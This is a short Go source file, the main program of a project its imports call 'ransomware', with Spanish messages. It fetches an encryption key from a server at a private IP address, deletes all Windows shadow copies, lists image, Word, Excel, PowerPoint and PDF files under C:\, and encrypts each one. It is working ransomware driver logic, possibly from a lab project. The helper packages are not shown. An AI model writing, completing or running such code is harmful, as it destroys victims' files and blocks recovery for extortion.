package main

import (
	"fmt"
	"ransomware/comunUtils"
	"ransomware/ransomUtils"
)

func main() {
	key, err := ransomUtils.obtenerClave("192.168.60.3:9090")
	if err != nil {
		fmt.Println("Error al obtener la palabra:", err)
		return
	}
	resultInfo, errShadowCopies := comunUtils.DeleteAllShadowCopies()
	if errShadowCopies != nil {
		panic(errShadowCopies)
	}
	fmt.Println(resultInfo)
	files, errListFiles := comunUtils.ListFiles(`C:\`, []string{"jpg", "jpeg", "png", "gif", "docx", "xlsx", "pptx", "pdf"})
	if errListFiles != nil {
		panic(errListFiles)
	}
	fmt.Println("Cifrando los siguientes archivos:")
	for _, file := range files {
		errEncrypt := ransomUtils.EncryptFile(file)
		if errEncrypt != nil {
			println("Error encriptando:", file, "\n", errEncrypt)
		}
		fmt.Println(file)
	}

	for true {

	}
}
